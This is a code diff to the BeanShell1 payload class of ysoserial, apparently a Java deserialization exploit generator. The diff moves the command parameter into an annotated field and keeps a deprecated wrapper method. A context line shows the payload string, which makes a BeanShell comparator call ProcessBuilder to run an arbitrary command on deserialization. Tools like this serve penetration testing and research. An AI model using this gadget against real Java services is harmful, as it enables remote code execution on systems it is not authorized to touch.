@@ -7,6 +7,9 @@ import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
 import java.util.Comparator;
 import java.util.PriorityQueue;
+
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.util.Reflections;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.PayloadRunner;
@@ -18,8 +21,17 @@ import ysoserial.payloads.util.PayloadRunner;
 @SuppressWarnings({ "rawtypes", "unchecked" })
 @Dependencies({ "org.beanshell:bsh:2.0b5" })
 public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
+	
+	@Bind private String command;
  
-    public PriorityQueue getObject(String command) throws Exception {
+    /**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
+	public PriorityQueue getObject(String command) throws Exception {
+		return getObject();
+	}
+
+	public PriorityQueue getObject() throws Exception {
 	// BeanShell payload
 	String payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"" + command + "\"}).start();return new Integer(1);}";
 
